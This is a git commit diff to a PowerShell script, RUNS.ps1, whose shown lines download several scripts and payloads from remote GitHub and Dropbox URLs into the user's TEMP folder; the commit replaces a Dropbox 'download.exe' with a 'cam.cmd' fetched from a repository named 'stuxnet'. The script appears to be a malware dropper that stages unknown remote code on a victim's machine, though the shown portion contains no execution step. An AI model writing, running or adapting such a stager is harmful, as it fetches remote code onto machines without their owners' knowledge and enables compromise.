ceab9f31aa16b011c70afe1c50b4413e6d12d9bb
Gaxi261 <127938084+Gaxi261@users.noreply.github.com>
2025-03-23 22:25:10 +1100

    Update RUNS.ps1

--- RUNS.ps1
+++ RUNS.ps1
@@ -4,8 +4,8 @@ Invoke-WebRequest -Uri $url1 -OutFile $output1
 $url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
 $output2 = "$env:TEMP\stop.ps1"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
-$url9 = "https://www.dropbox.com/scl/fi/swqja4ngiwf973dqy8v3v/download.exe?rlkey=p9cwbitz8sycwe3onyil4xmm6&st=0obgnzj5&dl=1"
-$output9 = "$env:TEMP\download.exe"
+$url9 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/cam.cmd"
+$output9 = "$env:TEMP\cam.cmd"
 Invoke-WebRequest -Uri $url9 -OutFile $output9
 $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
 $output3 = "$env:TEMP\BAT.ps1"
